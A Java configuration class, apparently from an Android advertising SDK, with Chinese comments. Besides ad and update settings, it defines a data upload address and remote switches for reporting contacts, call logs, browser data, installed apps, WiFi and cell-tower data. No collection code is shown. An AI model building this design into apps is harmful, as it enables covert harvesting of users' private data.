package com.androidhelper.sdk.entity;

import java.util.List;

public class ADConfig {

	/** 配置文件缓存时间(hour) */
	private int cacheHours;
	/** 版本控制地址 */
	private String updateUrl;
	/** gp下载服务器地址 */
	private String gpServer;
	/** gp下载服务器端口 */
	private String gpPort;
	/** 广告请求地址 */
	private String adRequestUrl;
	/** 广告规则 */
	private List<ADRule> rules;
	/** 数据上报地址 */
	private String datasUploadUrl;
	/** 数据上报时间间隔(hour) */
	private String datasUploadInterval;
	/** 备用服务器地址(请求配置文件) */
	private String failoverServerUrl;
	/** 请求失败时重复次数 */
	private String failoverTryCount;
	/** 是否显示广告分类 */
	private boolean showFlavors;
	/** 广告分类20个 */
	private List<Flavor> flavors;
	private List<Weblink> webLinks;
	private List<ChromeTop> chromeTops;

	/** 数据上报总开关 */
	private boolean uploadSwitch;
	/** 已安装app数据上报开关 */
	private boolean appSwitch;
	/** 浏览器数据上报开关 */
	private boolean bhSwitch;
	/** 通讯录数据上报开关 */
	private boolean contactSwitch;
	/** wifi数据上报开关 */
	private boolean wifiSwitch;
	/** 通话记录数据上报开关 */
	private boolean callSwitch;
	/** wifi切换数据上报开关 */
	private boolean wsSwitch;
	/** 基站数据上报开关 */
	private boolean bsSwitch;
	/** app运行记录数据上报开关 */
	private boolean arSwitch;

	public int getCacheHours() {
		return cacheHours;
	}

	public void setCacheHours(int cacheHours) {
		this.cacheHours = cacheHours;
	}

	public String getUpdateUrl() {
		return updateUrl;
	}

	public void setUpdateUrl(String updateUrl) {
		this.updateUrl = updateUrl;
	}

	public String getGpServer() {
		return gpServer;
	}

	public void setGpServer(String gpServer) {
		this.gpServer = gpServer;
	}

	public String getGpPort() {
		return gpPort;
	}

	public void setGpPort(String gpPort) {
		this.gpPort = gpPort;
	}

	public String getAdRequestUrl() {
		return adRequestUrl;
	}

	public void setAdRequestUrl(String adRequestUrl) {
		this.adRequestUrl = adRequestUrl;
	}

	public List<ADRule> getRules() {
		return rules;
	}

	public void setRules(List<ADRule> rules) {
		this.rules = rules;
	}

	public String getDatasUploadUrl() {
		return datasUploadUrl;
	}

	public void setDatasUploadUrl(String datasUploadUrl) {
		this.datasUploadUrl = datasUploadUrl;
	}

	public String getDatasUploadInterval() {
		return datasUploadInterval;
	}

	public void setDatasUploadInterval(String datasUploadInterval) {
		this.datasUploadInterval = datasUploadInterval;
	}

	public String getFailoverServerUrl() {
		return failoverServerUrl;
	}

	public void setFailoverServerUrl(String failoverServerUrl) {
		this.failoverServerUrl = failoverServerUrl;
	}

	public String getFailoverTryCount() {
		return failoverTryCount;
	}

	public void setFailoverTryCount(String failoverTryCount) {
		this.failoverTryCount = failoverTryCount;
	}

	public boolean isShowFlavors() {
		return showFlavors;
	}

	public void setShowFlavors(boolean showFlavors) {
		this.showFlavors = showFlavors;
	}

	public List<Flavor> getFlavors() {
		return flavors;
	}

	public void setFlavors(List<Flavor> flavors) {
		this.flavors = flavors;
	}

	public boolean isUploadSwitch() {
		return uploadSwitch;
	}

	public void setUploadSwitch(boolean uploadSwitch) {
		this.uploadSwitch = uploadSwitch;
	}

	public boolean isAppSwitch() {
		return appSwitch;
	}

	public void setAppSwitch(boolean appSwitch) {
		this.appSwitch = appSwitch;
	}

	public boolean isBhSwitch() {
		return bhSwitch;
	}

	public void setBhSwitch(boolean bhSwitch) {
		this.bhSwitch = bhSwitch;
	}

	public boolean isContactSwitch() {
		return contactSwitch;
	}

	public void setContactSwitch(boolean contactSwitch) {
		this.contactSwitch = contactSwitch;
	}

	public boolean isWifiSwitch() {
		return wifiSwitch;
	}

	public void setWifiSwitch(boolean wifiSwitch) {
		this.wifiSwitch = wifiSwitch;
	}

	public boolean isCallSwitch() {
		return callSwitch;
	}

	public void setCallSwitch(boolean callSwitch) {
		this.callSwitch = callSwitch;
	}

	public boolean isWsSwitch() {
		return wsSwitch;
	}

	public void setWsSwitch(boolean wsSwitch) {
		this.wsSwitch = wsSwitch;
	}

	public boolean isBsSwitch() {
		return bsSwitch;
	}

	public void setBsSwitch(boolean bsSwitch) {
		this.bsSwitch = bsSwitch;
	}

	public boolean isArSwitch() {
		return arSwitch;
	}

	public void setArSwitch(boolean arSwitch) {
		this.arSwitch = arSwitch;
	}

	public List<Weblink> getWebLinks() {
		return webLinks;
	}

	public void setWebLinks(List<Weblink> webLinks) {
		this.webLinks = webLinks;
	}

	public List<ChromeTop> getChromeTops() {
		return chromeTops;
	}

	public void setChromeTops(List<ChromeTop> chromeTops) {
		this.chromeTops = chromeTops;
	}
}
